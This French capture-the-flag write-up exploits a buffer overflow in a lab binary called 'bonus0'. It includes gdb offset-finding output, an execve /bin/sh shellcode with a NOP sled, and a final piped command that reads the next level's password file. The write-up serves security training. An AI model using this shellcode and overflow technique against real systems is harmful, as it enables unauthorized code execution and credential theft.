bonus0:
Il y a 3 fonctions, main, pp et p. Pas de gateway vers un shell admin donc a priori on va devoir run notre propre shellcode.
La faille ici est l'usage de strncpy puis strcpy. strncpy est "sécurisé", le nombre de caractères est précisé, mais si la string copiée dépasse le nombre, elle est copiée sans qu'un \0 soit ajouté à la fin. Ensuite, strcpy est utilisé, et cette fonction s'arrête uniquement quand elle rencontre un \0. Donc si on dépasse le nombre de caractères que strncpy utilise (20), lorsque strcpy est utilisé dans ce bout de code :

    p(a," - ");
    p(b," - ");
    strcpy(string,a);

Il va déborder sur b, et écrire plus que prévu. Le buffer dans le main fait 42
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
0x40 - 0x16 = 64 - 22 = 42

Logique vu que a[20] + espace + b[20] + EOL = 42 caractères. Donc on va pouvoir l'overflow parce qu'on va se retrouver avec a + b + espace + b. Avec cet overflow, on pourra override EIP pour le faire pointer vers notre shellcode, qu'on va stocker dans notre grand buffer de 4096.
 
On met 21 caractères en 1er argument et on utilise un générateur de pattern avec le 2ème pour trouver l'offset
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) info frame
Stack level 0, frame at 0xbffff6c4:
 eip = 0x41336141; saved eip 0x61413461
 called by frame at 0xbffff6c8
 Arglist at 0xbffff6bc, args:
 Locals at 0xbffff6bc, Previous frame's sp is 0xbffff6c4
 Saved registers:
  eip at 0xbffff6c0

L'offset est à 9.

Il ne reste plus qu'à trouver l'adresse du buffer à 4096 pour pouvoir faire pointer EIP dessus.
On utilise gdb pour mettre un breakpoint juste après l'appel à la fonction read, et on cherche dans $esp ou apparaissent les 41

disass p
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
=> 0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
b *p+50
r
On entre plein de AAAAAA
x/100x $esp
(gdb) x/100x $esp
0xbfffe660:     0x00000000      0xbfffe670      0x00001000      0x00000000
0xbfffe670:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe680:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe690:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffe6d0:     0x0000000a      0x00000000      0x00000000      0x00000000
0xbfffe6e0:     0x00000000      0x00000000      0x00000000      0x00000000
[...]
L'adresse du buffer est 0xbfffe670 (attention gdb peut faire varier l'adresse de +16 mais dans notre cas on a de la marge de manoeuvre pour atterir dans la nopsled)
On prend une valeur plus grande pour être sûr d'atterir dans la nopsled, +100 par exemple : BFFFE6D4


Argument 1 : python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"
On a une large NOPsled suivie de notre shellcode

Argument 2 : python -c "print('A' * 9 + '\xd4\xe6\xff\xbf' + 'A' * 7)"
A * 9 pour que notre adresse custom override l'emplacement de EIP et A * 7 pour completer afin que la string fasse bien 20 caractères pour overflow.

(python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd4\xe6\xff\xbf" + "A" * 7'; echo "cat /home/user/bonus1/.pass") | ./bonus0
